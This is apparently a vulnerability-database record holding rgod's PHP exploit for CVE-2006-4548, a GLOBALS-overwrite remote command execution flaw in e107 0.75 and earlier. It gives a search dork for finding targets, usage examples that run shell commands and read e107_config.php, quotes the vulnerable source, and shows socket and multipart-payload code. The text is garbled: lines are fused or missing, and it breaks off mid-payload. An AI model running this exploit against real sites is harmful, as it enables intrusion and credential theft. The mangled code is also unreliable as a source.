{
    "text": "vul_name : e107 <= 0.75 GLOBALS [  ] overwrite/Zend_Hash_Del_Key_Or_Index remote commands execution ， vul_cve : CVE-2006-4548 ， vul_poc :  #  ! /usr/bin/php -q -d short_open_tag=on ， <? ， print_r ( ' ， e107 <= 0.75 GLOBALS [  ] overwrite/Zend_Hash_Del_Key_Or_Index remote commands ， execution exploit ， by rgod rgod ( at ) autistici ( dot ) org [ email concealed ]  ， site :  ， dork : \"This site is powered by e107\" | inurl : e107_plugins | e107_handlers | e107_files ， ' )  ;  ， works with register_globals=On ， against PHP < 4.4.1 , 5 < PHP < 5.0.6 ， print_r ( ' ， Usage : php '. $ argv [ 0 ] .' host path cmd OPTIONS ， host : target server ( ip/hostname )  ， path : path to e107 ， cmd : a shell command ， Options :  ， -p [ port ]  : specify a port other than 80 ， -P [ ip : port ]  : specify a proxy ， Example :  ， php '. $ argv [ 0 ] .' localhost /e107/ ls -la -P1.1.1.1 : 80 ， php '. $ argv [ 0 ] .' localhost /e107/ cat ./././././e107_config.php -p81 ， ' )  ;  ， die ;  ， } ， software site :  ， vulnerable code in class2.php near lines 29-37 :  ， . ， / Destroy !  ( if we need to )  ， ST | retrieve_prefs | eplug_admin )  $ /' ,  $ global ) { ， unset (  $ global )  ;  [  ]  ， } ， } ， unset (  $ global )  ;  ， } ， . ， and in e107_handlers/tiny_mce/plugins/ibrowser/ibrowser.php near lines 26-40 :  ， . ， require_once ( \"././././class2.php\" )  ;  ， unset (  $ tinyMCE_imglib_include )  ; / [  *  ]  ， / include image library config settings ， include 'config.php' ;  ，  $ request_uri = urldecode ( empty (  $ HTTP_POST_VARS [ 'request_uri' ]  ) ? ( empty (  $ HTTP_GET_VARS [ 'r ， equest_uri' ]  ) ?' :  $ HTTP_GET_VARS [ 'request_uri' ]  )  :  $ HTTP_POST_VARS [ 'request ， _uri' ]  )  ;  ， / if set include file specified in $ tinyMCE_imglib_include ， { ， include $ tinyMCE_imglib_include ; / [  ]  ， } ， . ， you can evade [  *  ] by sending the hash keys of $ tinyMCE_imglib_include var and ，  [  ]  ( this * should * unsets the hash keys. ) by sending a multipart/form-data ， request with the \"GLOBALS\" var ， here [  ] the code will include the temporary file and execute our shellcode ， see ， y.html ， and ， error_reporting ( 0 )  ;  ， ini_set ( \"max_execution_time\" , 0 )  ;  ， ini_set ( \"default_socket_timeout\" , 5 )  ;  ， { ，  $ result=' ;  $ exa=' ;  $ cont=0 ;  ， { ， { $ result.=\" .\" ; } ， { $ result.=\" \". $ string [  $ i ]  ; } ， { $ exa.=\" \".dechex ( ord (  $ string [  $ i ]  )  ; } ， { $ exa.=\" 0\".dechex ( ord (  $ string [  $ i ]  )  ; } ，  $ cont+ ; if (  $ cont=15 ) { $ cont=0 ;  $ result.=\"rn\" ;  $ exa.=\"rn\" ; } ， } ， } ，  $ proxy_regex = ' ( bd{1 , 3}.d{1 , 3}.d{1 , 3}.d{1 , 3} : d{1 , 5}b ) ' ;  ， { ， global $ proxy ,  $ host ,  $ port ,  $ html ,  $ proxy_regex ;  ，  $ ock=fsockopen ( gethostbyname (  $ host )  ,  $ port )  ;  ， echo 'No response from '. $ host.' : '. $ port ; die ;  ， } ， } ，  $ c = preg_match (  $ proxy_regex ,  $ proxy )  ;  ， echo 'Not a valid proxy.' ; die ;  ， } ，  $ parts=explode ( ' : ' ,  $ proxy )  ;  ， echo \"Connecting to \". $ parts [ 0 ] .\" : \". $ parts [ 1 ] .\" proxy.rn\" ;  ，  $ ock=fsockopen (  $ parts [ 0 ]  ,  $ parts [ 1 ]  )  ;  ， echo 'No response from proxy.' ; die ;  ， } ， } ， fputs (  $ ock ,  $ packet )  ;  ，  $ html=' ;  ，  $ html.=fgets (  $ ock )  ;  ， } ， } ，  $ html=' ;  ，  $ html.=fread (  $ ock , 1 )  ;  ， } ， } ， fclose (  $ ock )  ;  ，  # debug ，  # echo \"rn\". $ html ;  ， } ，  $ host= $ argv [ 1 ]  ;  ，  $ path= $ argv [ 2 ]  ;  ，  $ cmd=\" ;  ，  $ port=80 ;  ，  $ proxy=\" ;  ，  $ temp= $ argv [  $ i ]  [ 0 ] . $ argv [  $ i ]  [ 1 ]  ;  ， { ，  $ port=str_replace ( \"-p\" , \" ,  $ argv [  $ i ]  )  ;  ， } ， { ，  $ proxy=str_replace ( \"-P\" , \" ,  $ argv [  $ i ]  )  ;  ， } ， } ，  $ data=\"-7d529a1d23092arn\" ;  # oh , I want to tell you a story , about a Telecom guy *  ，  $ data.=\"Content-Disposition : form-data ; name=\"tinyMCE_imglib_include\" ; filename=\"suntzu\" ; rn\" ;  # that doesn't know *  ，  $ data.=\"Content-Type : image/jpeg ; rnrn\" ;  # the sovereign art of PHP kung-fu , now is desperate and he's seriously * ",
    "time": "2006.09.08"
}